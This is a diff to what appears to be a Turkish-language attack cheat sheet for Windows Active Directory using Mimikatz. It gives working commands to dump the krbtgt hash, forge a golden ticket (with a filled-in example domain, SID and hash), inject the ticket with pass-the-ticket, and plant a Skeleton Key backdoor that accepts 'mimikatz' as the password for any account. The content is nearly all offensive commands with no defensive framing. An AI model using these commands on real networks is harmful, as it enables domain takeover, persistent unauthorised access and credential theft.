@@ -1,5 +1,14 @@
 1)lsadump::lsa /inject /name:krbtgt kullanılarak altın bilet oluşturmak için gereken bütün hashleri çıkartır
 
-2)Kerberos::golden /user:kullanıcı /domain:domain.asdfa /sid: /krbtgt: /id: 
+2)Kerberos::golden /user:kullanıcı /domain:domain.asdfa /sid: /krbtgt: /id:  == örn: Invoke-Mimikatz -Command '"Kerberos::golden /user:AdminimBne /domain:kedthesec.local /sid:S-1-5-21-2129465151-2710223712-1163647420-500 /krbtgt:3c3d78cf9e1063c03ec2e8fbe553cb62 /id:500"'
+
+3) Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
 
 3) misc::cmd kullanılarak yeni ticketımıza geçiş yapılır
+
+
+<<<<<<<<<<<<<<Skeleton Key Attack>>>>>>>>>>>>>>>>>
+
+Note: This attack allows us to log into any account we want using "mimikatz" as the password.
+
+misc::skeleton
